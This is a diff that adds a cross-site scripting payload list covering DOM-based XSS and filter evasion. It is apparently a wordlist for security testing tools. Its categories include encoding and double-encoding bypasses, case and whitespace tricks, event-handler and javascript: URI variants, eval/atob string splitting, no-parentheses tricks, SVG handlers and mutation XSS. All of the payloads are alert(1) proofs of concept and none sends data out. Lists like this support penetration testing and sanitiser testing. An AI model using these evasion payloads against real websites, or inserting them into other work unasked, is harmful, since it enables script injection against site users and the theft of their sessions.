@@ -1,0 +1,81 @@
+# XSS - DOM-based and Evasion Payloads
+
+# ==== DOM-based XSS ====
+location.hash=<script>alert(1)</script>
+#<script>alert(1)</script>
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# ==== Encoding Bypass ====
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# ==== Double Encoding ====
+%253Cscript%253Ealert(1)%253C/script%253E
+%25253Cscript%25253Ealert(1)%25253C/script%25253E
+
+# ==== Case Manipulation ====
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+<SVG ONLOAD=alert(1)>
+
+# ==== Comment/Whitespace Bypass ====
+<script>alert/**/('XSS')</script>
+<script>alert(1)</script   >
+<script>alert(1)</script	>
+<img src=x onerror	=alert(1)>
+<img src=x onerror
+=alert(1)>
+
+# ==== Event Handler Variations ====
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+<svg%09onload=alert(1)>
+<svg%0Aonload=alert(1)>
+<svg%0Conload=alert(1)>
+<svg%0Donload=alert(1)>
+<svg%09%0A%0C%0Donload=alert(1)>
+
+# ==== JavaScript URI Variations ====
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="javascript&#58;alert(1)">click</a>
+<a href="javascript&#0058;alert(1)">click</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+
+# ==== String Splitting ====
+<script>ale/**/rt(1)</script>
+<script>al\ert(1)</script>
+<script>eval('ale'+'rt(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('alert(1)')()</script>
+
+# ==== Template Literals ====
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+
+# ==== Constructor/Prototype ====
+<script>[].constructor.constructor('alert(1)')()</script>
+<script>''[!+[]+!![]+!![]+!![]+!![]]</script>
+
+# ==== No Parentheses ====
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<img src=x onerror=alert`1`>
+
+# ==== SVG Variants ====
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><handler event="click" javascript:alert(1)/>
+
+# ==== Mutation XSS ====
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
